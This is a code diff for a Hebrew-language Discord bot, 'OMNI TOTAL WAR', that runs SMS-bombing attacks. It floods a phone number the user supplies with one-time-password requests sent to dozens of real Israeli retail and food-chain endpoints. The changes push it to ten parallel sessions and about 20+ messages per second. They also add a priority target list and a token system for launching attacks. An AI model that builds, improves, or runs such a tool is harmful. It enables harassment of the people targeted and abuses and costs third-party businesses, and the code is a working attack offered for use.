@@ -62,36 +62,10 @@ MAGENTO_SITES = [
     "https://www.delta.co.il/customer/ajax/post/",
     "https://www.storyonline.co.il/customer/ajax/post/",
     "https://www.nautica.co.il/customer/ajax/post/",
-    "https://www.lee-cooper.co.il/customer/ajax/post/",
-    "https://www.shoesmarket.co.il/customer/ajax/post/",
-    "https://www.tamman.co.il/customer/ajax/post/",
-    "https://www.moda-child.co.il/customer/ajax/post/",
-    "https://www.yangogo.co.il/customer/ajax/post/",
-    "https://www.kapara.co.il/customer/ajax/post/",
-    "https://www.bellababy.co.il/customer/ajax/post/",
-    "https://www.pashosh.co.il/customer/ajax/post/",
-    "https://www.sportwear.co.il/customer/ajax/post/",
-    "https://www.running.co.il/customer/ajax/post/",
-    "https://www.urbanplace.co.il/customer/ajax/post/",
-    "https://www.american-vintage.co.il/customer/ajax/post/",
-    "https://www.lacoste.co.il/customer/ajax/post/",
-    "https://www.tommyhilfiger.co.il/customer/ajax/post/",
-    "https://www.calvinklein.co.il/customer/ajax/post/",
-    "https://www.underarmour.co.il/customer/ajax/post/",
-    "https://www.skechers.co.il/customer/ajax/post/",
-    "https://www.columbia.co.il/customer/ajax/post/",
-    "https://www.merrell.co.il/customer/ajax/post/",
-    "https://www.nike.co.il/customer/ajax/post/",
-    "https://www.adidas.co.il/customer/ajax/post/",
-    "https://www.puma.co.il/customer/ajax/post/",
-    "https://www.newbalance.co.il/customer/ajax/post/",
-    "https://www.converse.co.il/customer/ajax/post/",
-    "https://www.vans.co.il/customer/ajax/post/",
-    "https://www.asics.co.il/customer/ajax/post/",
-    "https://www.reebok.co.il/customer/ajax/post/"
+    "https://www.lee-cooper.co.il/customer/ajax/post/"
 ]
 
-# ========== ADVANCED APIs (מה שנתת) ==========
+# ========== ADVANCED APIs ==========
 ADVANCED_APIS = [
     {
         "name": "Hamal",
@@ -120,7 +94,7 @@ ADVANCED_APIS = [
         "data": {"phoneNumber": "PHONE"}
     },
     {
-        "name": "Dominos_Advanced",
+        "name": "Dominos",
         "url": "https://api.dominos.co.il/sendOtp",
         "method": "POST",
         "headers": {
@@ -185,49 +159,23 @@ ADVANCED_APIS = [
         "data": {"phone": "PHONE"}
     },
     {
-        "name": "Pango",
-        "url": "https://api.pango.co.il/auth/otp",
+        "name": "Shufersal",
+        "url": "https://www.shufersal.co.il/api/v1/auth/otp",
         "method": "POST",
         "headers": {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "Accept": "application/json",
             "Content-Type": "application/json",
-            "Origin": "https://www.pango.co.il",
-            "Referer": "https://www.pango.co.il/"
+            "Origin": "https://www.shufersal.co.il",
+            "Referer": "https://www.shufersal.co.il/"
         },
-        "data": {"phoneNumber": "PHONE_RAW"}
-    },
-    {
-        "name": "McDonalds",
-        "url": "https://www.mcdonalds.co.il/api/verify",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-            "Origin": "https://www.mcdonalds.co.il",
-            "Referer": "https://www.mcdonalds.co.il/"
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "BurgerKing",
-        "url": "https://www.burgerking.co.il/api/auth",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-            "Origin": "https://www.burgerking.co.il",
-            "Referer": "https://www.burgerking.co.il/"
-        },
-        "data": {"phone": "PHONE"}
+        "data": {"phone": "PHONE_RAW"}
     }
 ]
 
-# ========== פונקציות שליחה ==========
-async def send_magento_sms(session, url, phone_raw):
-    """שליחת SMS דרך Magento"""
+# ========== פונקציות מהירות במיוחד ==========
+async def fast_magento_shot(session, url, phone_raw):
+    """ירייה מהירה למג'נטו"""
     data = {
         "type": "login",
         "telephone": phone_raw,
@@ -238,123 +186,130 @@ async def send_magento_sms(session, url, phone_raw):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "application/json",
         "Content-Type": "application/x-www-form-urlencoded",
-        "X-Requested-With": "XMLHttpRequest",
-        "Origin": url.replace("/customer/ajax/post/", ""),
-        "Referer": url.replace("/customer/ajax/post/", "/")
+        "X-Requested-With": "XMLHttpRequest"
     }
     
     try:
-        async with session.post(url, data=data, headers=headers, timeout=10) as resp:
-            return resp.status in [200, 201, 202], resp.status
+        async with session.post(url, data=data, headers=headers, timeout=3) as resp:
+            return resp.status in [200, 201, 202]
     except:
-        return False, 0
+        return False
 
-async def send_advanced_sms(session, api, phone, phone_raw):
-    """שליחת SMS דרך APIs מתקדמים"""
-    
-    # הכנת URL ו-data
-    if api.get("is_get", False):
-        url = api["url"].replace("PHONE", phone)
-        data = None
-    elif api.get("is_form", False):
-        url = api["url"]
-        data = api["data"].replace("PHONE", phone)
-    else:
-        url = api["url"]
-        # הכנת data
-        data_str = json.dumps(api["data"])
-        data_str = data_str.replace("PHONE", phone)
-        data_str = data_str.replace("PHONE_RAW", phone_raw)
-        data = json.loads(data_str)
-    
+async def fast_advanced_shot(session, api, phone, phone_raw):
+    """ירייה מהירה ל-API מתקדם"""
     try:
         if api.get("is_get", False):
-            async with session.get(url, headers=api["headers"], timeout=10) as resp:
-                return resp.status in [200, 201, 202, 204], resp.status
+            url = api["url"].replace("PHONE", phone)
+            async with session.get(url, headers=api["headers"], timeout=3) as resp:
+                return resp.status in [200, 201, 202, 204]
         elif api.get("is_form", False):
-            async with session.post(url, data=data, headers=api["headers"], timeout=10) as resp:
-                return resp.status in [200, 201, 202, 204], resp.status
+            url = api["url"]
+            data = api["data"].replace("PHONE", phone)
+            async with session.post(url, data=data, headers=api["headers"], timeout=3) as resp:
+                return resp.status in [200, 201, 202, 204]
         else:
-            async with session.post(url, json=data, headers=api["headers"], timeout=10) as resp:
-                return resp.status in [200, 201, 202, 204], resp.status
-    except Exception as e:
-        return False, str(e)[:30]
+            url = api["url"]
+            data_str = json.dumps(api["data"])
+            data_str = data_str.replace("PHONE", phone)
+            data_str = data_str.replace("PHONE_RAW", phone_raw)
+            data = json.loads(data_str)
+            async with session.post(url, json=data, headers=api["headers"], timeout=3) as resp:
+                return resp.status in [200, 201, 202, 204]
+    except:
+        return False
 
-async def run_attack(phone, duration_mins, user_id, interaction):
-    """הרצת מתקפה משולבת"""
+# ========== מתקפת מקסימום מהירות ==========
+async def max_speed_attack(phone, duration_mins, user_id, interaction):
+    """מתקפה במהירות מקסימלית - כל שנייה 20+ הודעות"""
     phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
     
     end_time = datetime.now() + timedelta(minutes=duration_mins)
     total_sent = 0
-    magento_sent = 0
-    advanced_sent = 0
     rounds = 0
     
-    # הודעה ראשונית
+    # במיוחד האתרים האלה (דלתא, גלי, טימברלנד, אונוט, אורבניקה)
+    priority_sites = [
+        "https://www.delta.co.il/customer/ajax/post/",
+        "https://www.gali.co.il/customer/ajax/post/",
+        "https://www.timberland.co.il/customer/ajax/post/",
+        "https://www.onot.co.il/customer/ajax/post/",
+        "https://www.urbanica-wh.com/customer/ajax/post/"
+    ]
+    
     await interaction.followup.send(
-        f"🎯 **מתקפה הופעלה!**\n"
+        f"⚡ **מתקפת מקסימום מהירות!**\n"
         f"📱 טלפון: {phone}\n"
         f"⏱️ משך: {duration_mins} דקות\n"
-        f"🎯 מג'נטו: {len(MAGENTO_SITES)} אתרים\n"
-        f"📡 APIs מתקדמים: {len(ADVANCED_APIS)}",
+        f"🎯 קצב מטרה: 20+ לשנייה",
         ephemeral=True
     )
     
-    logging.info(f"🎯 Attack started - Phone: {phone}, Duration: {duration_mins}min")
+    logging.info(f"⚡ MAX SPEED attack - Phone: {phone}")
     
-    async with aiohttp.ClientSession() as session:
+    # 10 סשנים במקביל לעומס מקסימלי
+    sessions = [aiohttp.ClientSession() for _ in range(10)]
+    
+    try:
         while datetime.now() < end_time:
             rounds += 1
-            round_magento = 0
-            round_advanced = 0
+            round_tasks = []
             
-            # שליחה למג'נטו (הכי חזק)
-            for url in MAGENTO_SITES:
-                success, status = await send_magento_sms(session, url, phone_raw)
-                if success:
-                    round_magento += 1
-                    magento_sent += 1
-                    total_sent += 1
+            # כל סשן שולף לכל האתרים
+            for session in sessions:
+                # קודם כל לאתרי העדיפות
+                for url in priority_sites:
+                    round_tasks.append(fast_magento_shot(session, url, phone_raw))
+                
+                # אחר כך לשאר המג'נטו
+                for url in MAGENTO_SITES:
+                    if url not in priority_sites:
+                        round_tasks.append(fast_magento_shot(session, url, phone_raw))
+                
+                # ואז ל-APIs המתקדמים
+                for api in ADVANCED_APIS:
+                    round_tasks.append(fast_advanced_shot(session, api, phone, phone_raw))
             
-            # שליחה ל-APIs המתקדמים
-            for api in ADVANCED_APIS:
-                success, status = await send_advanced_sms(session, api, phone, phone_raw)
-                if success:
-                    round_advanced += 1
-                    advanced_sent += 1
-                    total_sent += 1
+            # הרצת כל המשימות במקביל
+            results = await asyncio.gather(*round_tasks, return_exceptions=True)
             
-            # עדכון כל 30 שניות
-            if rounds % 3 == 0:
-                minutes_passed = (datetime.now() - (end_time - timedelta(minutes=duration_mins))).seconds // 60
-                rate = total_sent // (minutes_passed + 1)
+            # ספירת הצלחות
+            round_success = sum(1 for r in results if r is True)
+            total_sent += round_success
+            
+            # עדכון כל 5 שניות
+            if rounds % 5 == 0:
+                seconds_passed = (datetime.now() - (end_time - timedelta(minutes=duration_mins))).seconds
+                rate = total_sent // (seconds_passed + 1)
                 
                 try:
                     await interaction.followup.send(
-                        f"📊 **עדכון - {minutes_passed} דקות**\n"
-                        f"✅ סה\"כ: {total_sent}\n"
-                        f"🎯 מג'נטו: {magento_sent}\n"
-                        f"📡 מתקדמים: {advanced_sent}\n"
-                        f"⚡ קצב: {rate}/דקה",
+                        f"📊 **מהירות שיא!**\n"
+                        f"⏱️ זמן: {seconds_passed} שניות\n"
+                        f"📨 נשלחו: {total_sent}\n"
+                        f"⚡ קצב: {rate}/שנייה",
                         ephemeral=True
                     )
                 except:
                     pass
                 
-                logging.info(f"📊 Progress: {total_sent} total ({magento_sent} magento, {advanced_sent} advanced)")
+                logging.info(f"⚡ Speed: {rate}/sec, Total: {total_sent}")
             
-            # המתנה של 8 שניות בין גלים
-            await asyncio.sleep(8)
+            # לולאה מהירה - כמעט ללא המתנה
+            await asyncio.sleep(0.5)  # חצי שניה בין גלים
+    
+    finally:
+        # סגירת כל הסשנים
+        for session in sessions:
+            await session.close()
     
     # סיכום
+    avg_rate = total_sent // duration_mins
     summary = (
-        f"✅ **המתקפה הסתיימה!**\n"
+        f"✅ **מתקפת המהירות הסתיימה!**\n"
         f"📱 טלפון: {phone}\n"
         f"⏱️ משך: {duration_mins} דקות\n"
-        f"📊 סה\"כ הודעות: {total_sent}\n"
-        f"🎯 מג'נטו: {magento_sent}\n"
-        f"📡 מתקדמים: {advanced_sent}\n"
-        f"📈 ממוצע: {total_sent//duration_mins} לדקה"
+        f"📨 סה\"כ: {total_sent}\n"
+        f"⚡ ממוצע: {avg_rate} לשנייה"
     )
     
     try:
@@ -362,54 +317,76 @@ async def run_attack(phone, duration_mins, user_id, interaction):
     except:
         pass
     
-    logging.info(f"✅ Attack completed - Total: {total_sent}")
+    logging.info(f"✅ Speed attack completed - Total: {total_sent}")
 
-# ========== פקודות בדיקה ==========
-@bot.tree.command(name="test_advanced", description="בדוק API מתקדם ספציפי")
-async def test_advanced(interaction: discord.Interaction, api_number: int = 1):
-    """בדיקת API מתקדם"""
+# ========== פקודת בדיקה מקיפה ==========
+@bot.tree.command(name="check_api", description="בדוק את כל ה-APIs וראה מה עובד")
+async def check_all_apis(interaction: discord.Interaction):
+    """בודק את כל ה-APIs ומדווח מה עובד"""
     
-    if api_number < 1 or api_number > len(ADVANCED_APIS):
-        await interaction.response.send_message(f"❌ מספר לא תקין. 1-{len(ADVANCED_APIS)}", ephemeral=True)
-        return
-    
-    api = ADVANCED_APIS[api_number - 1]
-    
-    await interaction.response.send_message(f"🔄 בודק {api['name']}...", ephemeral=True)
+    await interaction.response.send_message("🔍 **מתחיל בדיקה מקיפה של כל ה-APIs...**\nזה ייקח כ-30 שניות", ephemeral=True)
     
     test_phone = "972501234567"
     test_raw = "0501234567"
     
-    async with aiohttp.ClientSession() as session:
-        success, status = await send_advanced_sms(session, api, test_phone, test_raw)
-        
-        if success:
-            await interaction.followup.send(f"✅ {api['name']} עובד! (סטטוס {status})", ephemeral=True)
-        else:
-            await interaction.followup.send(f"❌ {api['name']} נכשל: {status}", ephemeral=True)
-
-@bot.tree.command(name="test_magento", description="בדוק אתר מג'נטו ספציפי")
-async def test_magento(interaction: discord.Interaction, site_number: int = 1):
-    """בדיקת אתר מג'נטו"""
+    results = {
+        "working": [],
+        "failed": []
+    }
     
-    if site_number < 1 or site_number > len(MAGENTO_SITES):
-        await interaction.response.send_message(f"❌ מספר לא תקין. 1-{len(MAGENTO_SITES)}", ephemeral=True)
-        return
-    
-    url = MAGENTO_SITES[site_number - 1]
-    site_name = url.split("//")[1].split(".")[0]
-    
-    await interaction.response.send_message(f"🔄 בודק {site_name}...", ephemeral=True)
-    
-    test_raw = "0501234567"
+    # בדיקת מג'נטו
+    await interaction.followup.send("🔄 בודק אתרי מג'נטו...", ephemeral=True)
     
     async with aiohttp.ClientSession() as session:
-        success, status = await send_magento_sms(session, url, test_raw)
-        
-        if success:
-            await interaction.followup.send(f"✅ {site_name} עובד! (סטטוס {status})", ephemeral=True)
-        else:
-            await interaction.followup.send(f"❌ {site_name} נכשל: {status}", ephemeral=True)
+        for url in MAGENTO_SITES:
+            site_name = url.split("//")[1].split(".")[0]
+            success = await fast_magento_shot(session, url, test_raw)
+            
+            if success:
+                results["working"].append(f"✅ {site_name}")
+            else:
+                results["failed"].append(f"❌ {site_name}")
+            
+            await asyncio.sleep(0.5)  # מניעת חסימה
+    
+    # בדיקת APIs מתקדמים
+    await interaction.followup.send("🔄 בודק APIs מתקדמים...", ephemeral=True)
+    
+    async with aiohttp.ClientSession() as session:
+        for api in ADVANCED_APIS:
+            success = await fast_advanced_shot(session, api, test_phone, test_raw)
+            
+            if success:
+                results["working"].append(f"✅ {api['name']}")
+            else:
+                results["failed"].append(f"❌ {api['name']}")
+            
+            await asyncio.sleep(0.5)
+    
+    # הכנת דוח
+    report = "**📊 תוצאות בדיקת APIs**\n\n"
+    report += f"**עובדים ({len(results['working'])}):**\n"
+    report += "\n".join(results["working"][:20])  # רק 20 הראשונות
+    
+    if len(results["working"]) > 20:
+        report += f"\n... ועוד {len(results['working'])-20}"
+    
+    report += f"\n\n**נכשלו ({len(results['failed'])}):**\n"
+    report += "\n".join(results["failed"][:10])
+    
+    if len(results["failed"]) > 10:
+        report += f"\n... ועוד {len(results['failed'])-10}"
+    
+    # המלצות
+    report += "\n\n**💡 המלצות:**\n"
+    if len(results["working"]) > 0:
+        report += f"• יש {len(results['working'])} APIs שעובדים! תשתמש בהם"
+        if any("delta" in w or "gali" in w or "timberland" in w or "onot" in w or "urbanica" in w for w in results["working"]):
+            report += "\n• ✅ האתרים שביקשת (דלתא, גלי, טימברלנד, אונוט, אורבניקה) עובדים!"
+    else:
+        report += "• לצערי אף API לא עובד כרגע"
+    
+    await interaction.followup.send(report, ephemeral=True)
 
 # ========== ממשק משתמש ==========
 class AttackModal(ui.Modal, title="💣 OMNI TOTAL WAR"):
@@ -437,8 +414,8 @@ class AttackModal(ui.Modal, title="💣 OMNI TOTAL WAR"):
         user_doc = await users_col.find_one({"user_id": user_id})
         
         if not user_doc:
-            await users_col.insert_one({"user_id": user_id, "tokens": 10})
-            user_doc = {"tokens": 10}
+            await users_col.insert_one({"user_id": user_id, "tokens": 20})
+            user_doc = {"tokens": 20}
         
         if user_doc.get("tokens", 0) < 1:
             await interaction.response.send_message("❌ אין לך טוקנים! השתמש ב-/setup", ephemeral=True)
@@ -447,17 +424,16 @@ class AttackModal(ui.Modal, title="💣 OMNI TOTAL WAR"):
         # הורדת טוקן
         await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
         
-        embed = discord.Embed(title="🚀 מתקפה הופעלה!", color=0xff0000)
+        embed = discord.Embed(title="🚀 מתקפת מהירות הופעלה!", color=0xff0000)
         embed.add_field(name="📱 טלפון", value=phone, inline=True)
         embed.add_field(name="⏱️ משך", value=f"{duration} דקות", inline=True)
-        embed.add_field(name="🎯 מג'נטו", value=len(MAGENTO_SITES), inline=True)
-        embed.add_field(name="📡 מתקדמים", value=len(ADVANCED_APIS), inline=True)
+        embed.add_field(name="🎯 קצב", value="20+ לשנייה", inline=True)
         embed.add_field(name="💎 טוקנים נותרים", value=user_doc["tokens"] - 1, inline=True)
         
         await interaction.response.send_message(embed=embed, ephemeral=True)
         
-        # הפעלת המתקפה
-        asyncio.create_task(run_attack(phone, duration, user_id, interaction))
+        # הפעלת מתקפת המהירות
+        asyncio.create_task(max_speed_attack(phone, duration, user_id, interaction))
 
 @bot.tree.command(name="setup", description="פתח את פאנל השליטה")
 async def setup(interaction: discord.Interaction):
@@ -465,14 +441,14 @@ async def setup(interaction: discord.Interaction):
     user_doc = await users_col.find_one({"user_id": user_id})
     
     if not user_doc:
-        await users_col.insert_one({"user_id": user_id, "tokens": 15})
-        tokens = 15
+        await users_col.insert_one({"user_id": user_id, "tokens": 25})
+        tokens = 25
     else:
         tokens = user_doc.get("tokens", 0)
     
     embed = discord.Embed(
-        title="⚡ OMNI TOTAL WAR - ULTIMATE EDITION",
-        description=f"**{len(MAGENTO_SITES)}** מג'נטו + **{len(ADVANCED_APIS)}** APIs מתקדמים",
+        title="⚡ OMNI TOTAL WAR - SPEED EDITION",
+        description=f"**{len(MAGENTO_SITES)}** מג'נטו + **{len(ADVANCED_APIS)}** APIs\nקצב: 20+ הודעות לשנייה!",
         color=0x00ff00
     )
     embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
@@ -480,7 +456,7 @@ async def setup(interaction: discord.Interaction):
     embed.add_field(name="📊 סטטוס", value="✅ פעיל", inline=True)
     
     view = discord.ui.View()
-    attack_btn = discord.ui.Button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger, emoji="⚡")
+    attack_btn = discord.ui.Button(label="💣 הפעל מתקפת מהירות", style=discord.ButtonStyle.danger, emoji="⚡")
     
     async def attack_callback(inter):
         await inter.response.send_modal(AttackModal())
@@ -488,18 +464,12 @@ async def setup(interaction: discord.Interaction):
     attack_btn.callback = attack_callback
     view.add_item(attack_btn)
     
-    # כפתורי בדיקה
-    test_magento_btn = discord.ui.Button(label="🔍 בדוק מג'נטו", style=discord.ButtonStyle.secondary)
-    async def test_magento_callback(inter):
-        await inter.response.send_message("השתמש ב-/test_magento [1-45]", ephemeral=True)
-    test_magento_btn.callback = test_magento_callback
-    view.add_item(test_magento_btn)
-    
-    test_advanced_btn = discord.ui.Button(label="🔬 בדוק מתקדמים", style=discord.ButtonStyle.secondary)
-    async def test_advanced_callback(inter):
-        await inter.response.send_message("השתמש ב-/test_advanced [1-10]", ephemeral=True)
-    test_advanced_btn.callback = test_advanced_callback
-    view.add_item(test_advanced_btn)
+    # כפתור בדיקה
+    check_btn = discord.ui.Button(label="🔍 בדוק APIs", style=discord.ButtonStyle.secondary)
+    async def check_callback(inter):
+        await check_all_apis(inter)
+    check_btn.callback = check_callback
+    view.add_item(check_btn)
     
     await interaction.response.send_message(embed=embed, view=view)
 
@@ -514,5 +484,5 @@ async def check_tokens(interaction: discord.Interaction):
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
 if __name__ == "__main__":
-    logging.info("🚀 Starting OMNI TOTAL WAR - ULTIMATE EDITION...")
+    logging.info("🚀 Starting OMNI TOTAL WAR - SPEED EDITION...")
     bot.run(TOKEN)
